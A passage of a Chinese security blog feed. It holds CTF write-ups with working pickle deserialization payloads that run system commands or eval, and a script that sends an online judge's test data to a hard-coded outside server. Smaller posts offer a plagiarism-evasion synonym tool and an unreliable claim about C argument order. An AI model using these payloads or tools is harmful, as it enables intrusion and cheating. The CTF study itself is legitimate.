-d&#39;)\&#39;\&#39;\&#39;)&#39;tR.&#39;&#39;&#39;</code></pre><p>最后就差secret_key了,看别人的wp都是调试易得易得secret_key//</p><p>但是我是没找到,于是自己写了个过滤器</p><p>递归查找settings</p><pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirectfrom django.template import enginesfrom django.contrib.auth import login as auth_login, get_user_model, authenticatefrom django.contrib.auth.views import LoginView, logout_then_loginfrom django.contrib.auth.decorators import login_requiredfrom django.views import genericfrom django import templateimport djangofrom django import templateregister = template.Library()@register.filterdef get_dict(obj,way=&quot;&quot;,depth=0):    if depth&gt;11:        return     objdir=dir(obj)    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}    result=&quot;&quot;    for i in objdir:                    try :            if &#39;_&#39; == i[0]:                continue            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1)         except TypeError:            pass    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:        print(way)        return result+way+&quot;\n&quot;    return result</code></pre><p>这次是真的易得了:),至此结束</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><pre><code class="python">#!/usr/bin/python3 -uimport securePickle as pickleimport codecspickle.whitelist.append(&#39;sys&#39;)class Pysh(object):    def __init__(self):        self.login()        self.cmds = {}    def login(self):        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><pre><code class="python">import pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        return pickle.Unpickler.find_class(self, module, name)def loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps</code></pre><p>只允许sys里的属性,而且属性里不能有.</p><pre><code>[&#39;__displayhook__&#39;, &#39;__doc__&#39;, &#39;__excepthook__&#39;, &#39;__interactivehook__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;__stderr__&#39;, &#39;__stdin__&#39;, &#39;__stdout__&#39;, &#39;_clear_type_cache&#39;, &#39;_current_frames&#39;, &#39;_debugmallocstats&#39;, &#39;_getframe&#39;, &#39;_git&#39;, &#39;_home&#39;, &#39;_xoptions&#39;, &#39;abiflags&#39;, &#39;api_version&#39;, &#39;argv&#39;, &#39;base_exec_prefix&#39;, &#39;base_prefix&#39;, &#39;builtin_module_names&#39;, &#39;byteorder&#39;, &#39;call_tracing&#39;, &#39;callstats&#39;, &#39;copyright&#39;, &#39;displayhook&#39;, &#39;dont_write_bytecode&#39;, &#39;exc_info&#39;, &#39;excepthook&#39;, &#39;exec_prefix&#39;, &#39;executable&#39;, &#39;exit&#39;, &#39;flags&#39;, &#39;float_info&#39;, &#39;float_repr_style&#39;, &#39;get_asyncgen_hooks&#39;, &#39;get_coroutine_wrapper&#39;, &#39;getallocatedblocks&#39;, &#39;getcheckinterval&#39;, &#39;getdefaultencoding&#39;, &#39;getdlopenflags&#39;, &#39;getfilesystemencodeerrors&#39;, &#39;getfilesystemencoding&#39;, &#39;getprofile&#39;, &#39;getrecursionlimit&#39;, &#39;getrefcount&#39;, &#39;getsizeof&#39;, &#39;getswitchinterval&#39;, &#39;gettrace&#39;, &#39;hash_info&#39;, &#39;hexversion&#39;, &#39;implementation&#39;, &#39;int_info&#39;, &#39;intern&#39;, &#39;is_finalizing&#39;, &#39;last_traceback&#39;, &#39;last_type&#39;, &#39;last_value&#39;, &#39;maxsize&#39;, &#39;maxunicode&#39;, &#39;meta_path&#39;, &#39;modules&#39;, &#39;path&#39;, &#39;path_hooks&#39;, &#39;path_importer_cache&#39;, &#39;platform&#39;, &#39;prefix&#39;, &#39;ps1&#39;, &#39;ps2&#39;, &#39;set_asyncgen_hooks&#39;, &#39;set_coroutine_wrapper&#39;, &#39;setcheckinterval&#39;, &#39;setdlopenflags&#39;, &#39;setprofile&#39;, &#39;setrecursionlimit&#39;, &#39;setswitchinterval&#39;, &#39;settrace&#39;, &#39;stderr&#39;, &#39;stdin&#39;, &#39;stdout&#39;, &#39;thread_info&#39;, &#39;version&#39;, &#39;version_info&#39;, &#39;warnoptions&#39;]</code></pre><p>发现有个modules,但是loads那里有一个死亡raise</p><p><code>sys._getframe</code> 可以返回带有exec的字典,但是好像没啥用</p><p>现在问题是不知道如何取出modules里的值</p><p>阅读文档发现</p><blockquote><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p></blockquote><p>可以修改modules来修改模块内容</p><pre><code class="shell">&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&#39;sys&#39;]=sys.modules&gt;&gt;&gt; import sys&gt;&gt;&gt; dir(sys)[&#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;fromkeys&#39;, &#39;get&#39;, &#39;items&#39;, &#39;keys&#39;, &#39;pop&#39;, &#39;popitem&#39;, &#39;setdefault&#39;, &#39;update&#39;, &#39;values&#39;]</code></pre><p>然后sys就被替换成sys.modules了,就可以拿到os了</p><p>然后再对sys.modules[‘sys’]再赋值为os</p><p>就可以import os了</p><p>(师傅们tql)</p><p>构造payload</p><pre><code>csysmodulesS&#39;sys&#39;csysmodulesp100scsysget(S&#39;os&#39;tRp101g100S&#39;sys&#39;g101scsyssystem(S&#39;dir&#39;tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><pre><code class="python">#!/usr/bin/python3 -uimport securePickle as pickleimport codecspickle.whitelist.append(&#39;structs&#39;)class Pysh(object):    def __init__(self):        self.login()        self.cmds = {            &#39;help&#39;: self.cmd_help,            &#39;flag&#39;: self.cmd_flag,        }    def login(self):        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()    def cmd_help(self):        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))    def cmd_su(self):        print(&quot;Not Implemented QAQ&quot;)        # self.user.privileged = 1    def cmd_flag(self):        print(&quot;Not Implemented QAQ&quot;)if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><p>这次更骚了直接给了个空模块</p><pre><code class="shell">&gt;&gt;&gt; dir(structs)[&#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre><p><code>__spec__,__loader__,__builtins__</code>是我们需要注意的</p><p>我们看一下操作码c(看重载后的find_class代码,看别人wp的时候没看重载后的find_class,然后连wp都看不懂了)的实现,发现调用了<code>__import__</code></p><p>在文档中发现</p><blockquote><p>此函数(<code>__import__</code>)会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义 </p></blockquote><p>而<code>__buiutins__</code>里面也有<code>__import__</code></p><pre><code>&gt;&gt;&gt; structs.__builtins__[&#39;__import__&#39;]=eval&gt;&gt;&gt; import osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: eval expected at most 3 arguments, got 5&gt;&gt;&gt; __import__(&#39;print(123)&#39;)123</code></pre><p>成功修改了<code>__import__</code></p><p>我们再看重载的find_class</p><p>securePickle.py</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        module = __import__(module)        return getattr(module, name)#一般重载都会改成if xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)</code></pre><p>而原来的find_class是这样的</p><pre><code class="python">def find_class:    __import__(module, level=0)    return getattr(sys.modules[module], name)</code></pre><p>接着我们可以通过操作码c来实现一下操作</p><pre><code class="python">return getattr(__import__(module), name)</code></pre><p>如果能令<code>__import__(module)</code>的返回值为<code>__builtins__</code>时,就可以取出<code>__builtins__</code>里的值</p><p>结合<a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1" target="_blank" rel="noopener">魔术方法</a><code>__getattribute__</code>便可以实现</p><p>于是构造</p><pre><code class="python">bis=structs.__builtins__structs.__setattr__(&#39;structs&#39;,bis)#name只能为structsbis[&#39;__import__&#39;]=structs.__getattribute__getattr(__import__(&quot;structs&quot;),&quot;get&quot;)(&quot;eval&quot;)(&quot;print(123)&quot;)</code></pre><p>对应的pickle代码</p><pre><code>cstructs__builtins__p1000cstructs__setattr__(S&#39;structs&#39;g100tRg100S&#39;__import__&#39;cstructs__getattribute__scstructsget(S&quot;eval&quot;tR(S&#39;print(123)&#39;tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p><pre><code class="python">class User(object):    def __init__(self, name, group):        self.name = name        self.group = group        self.isadmin = 0        self.prompt = &#39;&#39;</code></pre><pre><code class="python">import pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        return pickle.Unpickler.find_class(self, module, name)def loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps</code></pre><p>server.py</p><pre><code class="python">import securePickle as pickleimport codecsimport ospickle.whitelist.append(&#39;structs&#39;)class Pysh(object):    def __init__(self):        self.key = os.urandom(100)        self.login()        self.cmds = {            &#39;help&#39;: self.cmd_help,            &#39;whoami&#39;: self.cmd_whoami,            &#39;su&#39;: self.cmd_su,            &#39;flag&#39;: self.cmd_flag,        }    def login(self):        with open(&#39;../flag.txt&#39;, &#39;rb&#39;) as f:            flag = f.read()        flag = bytes(a ^ b for a, b in zip(self.key, flag))        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)        user.privileged = False        user.flag = flag        self.user = user    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()    def cmd_help(self):        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))    def cmd_whoami(self):        print(self.user.name, self.user.group)    def cmd_su(self):        print(&quot;Not Implemented QAQ&quot;)        # self.user.privileged = 1    def cmd_flag(self):        if not self.user.privileged:            print(&#39;flag: Permission denied&#39;)        else:            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><p>如果我们想拿到flag,要么命令执行直接拿flag要么就令<code>user.privileged=True</code> 调用cmd_flag来拿flag</p><p>但是再反序列化处</p><pre><code class="python">        user = pickle.loads(user)        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)        user.privileged = False</code></pre><p><code>user.privileged</code>会被覆盖为False,再康康其他的信息把</p><p><code>dir(structs)</code>:</p><pre><code class="python">[&#39;User&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre><hr><p>几个小时后,看wp学成归来.</p><p>我:艹,太骚了,师傅们牛逼死了</p><hr><p>之前说有两个解题思路,命令执行这一个思路在看了一会之后就觉得不太行,毫无头绪</p><p>再康康让<code>user.privileged=False</code>失效这一思路,emmmm感觉也不太行.</p><p>但是,类的赋值肯定会受到一些特殊函数的影响</p><p>在研究类的赋值的时候可以找到<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">描述符</a>可以自定义赋值函数</p><p>那么如果我们能让User的<code>__set__</code>变成一个接受3个参数的函数,就可以令<code>user.privileged=False</code>无效</p><p>但是很显然pickle里是无法直接编写代码的,令<code>__set__=&quot;&quot;</code>?更不行,会直接报错</p><p>继续阅读代码我们会发现一个神奇的东西</p><pre><code class="python">class User(object):    def __init__(self, name, group):        self.name = name        self.group = group        self.isadmin = 0        self.prompt = &#39;&#39;        print(&quot;name:%s ,group:%s&quot;%(name,group))</code></pre><p><code>User.__init__</code>刚好接受三个参数</p><p>我们能不能让<code>__set__=User</code>?,然后调用<code>__set__</code>的时候调用<code>User.__init__</code></p><pre><code class="python">&gt;&gt;&gt; setattr(User,&#39;test&#39;,User(123,123))name:123 ,group:123&gt;&gt;&gt; setattr(User,&quot;__set__&quot;,User)&gt;&gt;&gt; b=User(123,123)name:123 ,group:123&gt;&gt;&gt; b.test=123123name:&lt;structs.User object at 0x0000017BA1538748&gt; ,group:123123</code></pre><p>于是构造:</p><pre><code class="python">a=__import__(&quot;structs&quot;).Userb=User(&quot;123&quot;,&quot;456&quot;)setattr(a,&quot;privileged&quot;,b)setattr(a,&quot;__set__&quot;,a)return b</code></pre><p>对应的pickle代码为</p><pre><code>cstructsUserp100(S&quot;123&quot;S&quot;456&quot;tRp101g100(N}S&#39;privileged&#39;g101sS&#39;__set__&#39;g100stbg101.</code></pre><pre><code>$ helpAvailable commands: help whoami su flag$ whoami123 456$ flagb&#39;Balsn{pY7h0n1dae_ObJ3c7}\n&#39;</code></pre><p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><p> <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p><p> <a href="https://xz.aliyun.com/t/5306" target="_blank" rel="noopener">https://xz.aliyun.com/t/5306</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/16/pickle/">https://www.ccreater.top/2019/12/16/pickle/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勉强能用的论文降重</title>
      <link href="2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/"/>
      <url>2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="勉强能用的论文降重"><a href="#勉强能用的论文降重" class="headerlink" title="勉强能用的论文降重"></a>勉强能用的论文降重</h1><pre><code class="python">import sysif len(sys.argv) !=2:    print(&quot;Usage: %s inputfile outputfile&quot; % sys.argv[0])    exit()import synonymsf=sys.argv[1]s=&quot;&quot;with open(f,&quot;r&quot;) as fl:    s=fl.read()resstr,stype=synonyms.seg(s)with open(sys.argv[2],&quot;w&quot;) as fw:    for i in resstr:        if len(i)==1:            fw.write(i)        else :            nearbystr,num=synonyms.nearby(i)            if len(nearbystr)&gt;1 and num[1]&gt; 0.75:                print(nearbystr[1],num[1])                fw.write(nearbystr[1])            else :                fw.write(i)</code></pre><p>可以调整<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>来修改近义词的准确率.</p><p>用完之后一定要自己校对一遍!!!不然…..</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/15/勉强能用的论文降重/">https://www.ccreater.top/2019/12/15/勉强能用的论文降重/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在线oj获取数据</title>
      <link href="2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="在线oj获取数据"><a href="#在线oj获取数据" class="headerlink" title="在线oj获取数据"></a>在线oj获取数据</h1><p>python3:</p><pre><code class="python">import socketimport sys    ip = &#39;39.108.164.219&#39;port = 60000def send_raw(raw):    try:        with socket.create_connection((ip, port), timeout=10) as conn:            conn.send(bytes(raw,encoding=&quot;ascii&quot;))            conn.close()    except:        return False      return Truedata=&quot;&quot;for line in sys.stdin:    data+=linesend_raw(data)</code></pre><p>vps上运行</p><pre><code class="shell">#!/bin/bashi=1while [ $i -eq 1 ]do      nc -FNlp 60000  &gt;&gt; /tmp/data    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/datadone</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/15/在线oj获取数据/">https://www.ccreater.top/2019/12/15/在线oj获取数据/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由cout和printf来对函数传参过程的探讨</title>
      <link href="2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/"/>
      <url>2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="由cout和printf来对函数传参过程的探讨"><a href="#由cout和printf来对函数传参过程的探讨" class="headerlink" title="由cout和printf来对函数传参过程的探讨"></a>由cout和printf来对函数传参过程的探讨</h1><h2 id="令人疑惑的结果"><a href="#令人疑惑的结果" class="headerlink" title="令人疑惑的结果"></a>令人疑惑的结果</h2><p>来看一个代码吧</p><pre><code class="c++">#include&lt;stdio.h&gt;int i=0;int update(){i++;return i;}int main(){    printf(&quot;update():%d i:%d\n&quot;,update(),i);    return 0;}</code></pre><p>你觉得它的输出结果是什么<br><del>update():1 i:1</del> ?<br><strong>错</strong>，正确输出是<code>update():1 i:0</code></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>为何会如此,先来做个实验康康吧:</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    printf(&quot;----------------------------test printf----------------------------\n&quot;);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;update():%d i:%d\n&quot;,update(),i);    printf(&quot;later:%d\n&quot;,i);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;i:%d update():%d \n&quot;,i,update());    printf(&quot;later:%d\n&quot;,i);    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());}</code></pre><p>它的输出结果是</p><pre><code>----------------------------test printf----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><p>只有printf是这样的?不，可变参数的打印函数都具有这样的特性<br>我们来测试一下cout来验证一下</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;    i=0;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;}</code></pre><p>它的输出结果是:</p><pre><code>---------------------------- test cout ----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><h2 id="汇编层面的解释"><a href="#汇编层面的解释" class="headerlink" title="汇编层面的解释"></a>汇编层面的解释</h2><p>为什么会这样,这就必须说起c和c++中关于函数传参的过程了:</p><p>在汇编中函数传参要从最后一个参数到第一个参数分别入栈，这样函数取参数的时候，pop出来的顺序才是1-n。</p><p>因此,在<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>中,函数先压入i,再执行update(),将其返回值压入栈。</p><p>以上只是理论，真实的环境中由x86,x64,32位,16位机,它们的具体的传参方式略有不同:)  </p><p>我们来看一下x64下这一条语句的汇编代码</p><pre><code>mov     ebx, cs:icall    _Z6updatev      ; update(void)mov     r8d, ebxmov     edx, eaxlea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈。</p><p>上述代码中 格式化字符串在rcx中(最后一个赋值),update()返回值在edx,中第二个赋值。i在r8中第一个赋值 。</p><p>但是我们可以看到<code>mov     ebx, cs:i</code>程序先将i的值移动到ebx中，再调用update函数,将返回值所在寄存器eax移动到edx中。</p><p>虽然过程有点变化,但是最后的结果还是和在汇编中函数传参要从最后一个参数到第一个参数分别入栈。</p><h2 id="来练习一下吧"><a href="#来练习一下吧" class="headerlink" title="来练习一下吧"></a>来练习一下吧</h2><p>最后上一个题目吧//</p><pre><code class="c++">#include &lt;stdio.h&gt;int main(){    long long a = 1, b = 2, c = 3;    printf(&quot;%d %d %d\n&quot;, a,b,c);    return 0;}</code></pre><p>求输出</p><p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">答案和解析</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/14/由cout和printf来对函数传参过程的探讨/">https://www.ccreater.top/2019/12/14/由cout和printf来对函数传参过程的探讨/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="2019/12/14/hello-world/"/>
      <url>2019/12/14/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/14/hello-world/">https://www.ccreater.top/2019/12/14/hello-world/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tuctf2019</title>
      <link href="2019/11/30/tuctf/"/>
      <url>2019/11/30/tuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="tuctf2019"><a href="#tuctf2019" class="headerlink" title="tuctf2019"></a>tuctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Router-Where-Art-Thou"><a href="#Router-Where-Art-Thou" class="headerlink" title="Router Where Art Thou?"></a>Router Where Art Thou?</h3><p> <a href="http://chal.tuctf.com:30006/0.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/0.html</a> </p><p> <a href="http://chal.tuctf.com:30006/1.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/1.html</a></p><p> <a href="http://chal.tuctf.com:30006/2.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/2.html</a>  </p><p><code>FIXME: need to use Page::includeStaticResource</code></p><p><code>2.html:603  hidden variables, we are going to set this to the session, bug fix 2157</code></p><p><a href="https://192.168.1.254/" target="_blank" rel="noopener">https://192.168.1.254/</a></p><p>….爆破密码获得flag</p><h3 id="Login-to-Access"><a href="#Login-to-Access" class="headerlink" title="Login to Access"></a>Login to Access</h3><p>当Referer不为<a href="http://chal.tuctf.com:30001/login.html时,存在sql注入" target="_blank" rel="noopener">http://chal.tuctf.com:30001/login.html时,存在sql注入</a></p><p>当Referer: <a 